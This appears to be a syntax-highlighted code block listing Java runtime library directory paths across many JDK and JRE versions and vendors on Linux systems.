<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">11</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.11</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.12</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.16</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.20</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>i386<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">6</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">7</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>oracle<span class="token operator">-</span>x64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java6<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java7<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>oracle<span class="token operator">-</span>java8<span class="token operator">-</span>jdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>ibd<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>ibm<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.1</span><span class="token operator">-</span>ibm<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.1</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>sun<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.11</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jre<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.11</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span>amd64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>jdk<span class="token operator">-</span><span class="token number">8</span><span class="token operator">-</span>oracle<span class="token operator">-</span>arm<span class="token operator">-</span>vfp<span class="token operator">-</span>hflt<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.6</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>amazon<span class="token operator">-</span>corretto<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.0</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.45</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.65</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.75</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.79</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.91</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.101</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.7</span><span class="token number">.0</span><span class="token number">.191</span><span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">2.</span>b13<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">3.</span>b17<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.102</span><span class="token operator">-</span><span class="token number">4.</span>b14<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.161</span><span class="token operator">-</span><span class="token number">2.</span>b14<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.171</span><span class="token operator">-</span><span class="token number">7.</span>b10<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">11.</span>b12<span class="token punctuation">.</span>el7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.31</span><span class="token operator">-</span><span class="token number">1.</span>b13<span class="token punctuation">.</span>el6_6<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.65</span><span class="token operator">-</span><span class="token number">2.</span>b17<span class="token punctuation">.</span>el7_1<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.77</span><span class="token operator">-</span><span class="token number">0.</span>b03<span class="token punctuation">.</span>el6_7<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.91</span><span class="token operator">-</span><span class="token number">0.</span>b14<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.101</span><span class="token operator">-</span><span class="token number">3.</span>b13<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.102</span><span class="token operator">-</span><span class="token number">1.</span>b14<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">0.</span>b15<span class="token punctuation">.</span>el6_8<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">1.</span>b15<span class="token punctuation">.</span>el7_2<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.111</span><span class="token operator">-</span><span class="token number">2.</span>b15<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.121</span><span class="token operator">-</span><span class="token number">0.</span>b13<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">0.</span>b11<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">2.</span>b11<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.131</span><span class="token operator">-</span><span class="token number">3.</span>b12<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">1.</span>b16<span class="token punctuation">.</span>el7_3<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.141</span><span class="token operator">-</span><span class="token number">3.</span>b16<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.144</span><span class="token operator">-</span><span class="token number">0.</span>b01<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.144</span><span class="token operator">-</span><span class="token number">0.</span>b01<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span>el6_9<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">1.</span>b12<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
<span class="token operator">/</span>usr<span class="token operator">/</span>lib<span class="token operator">/</span>jvm<span class="token operator">/</span>java<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token operator">-</span>openjdk<span class="token operator">-</span><span class="token number">1.8</span><span class="token number">.0</span><span class="token number">.151</span><span class="token operator">-</span><span class="token number">5.</span>b12<span class="token punctuation">.</span>el7_4<span class="token punctuation">.</span>x86_64<span class="token operator">/</span>jre<span class="token operator">/</span>lib<span class="token operator">/</span>
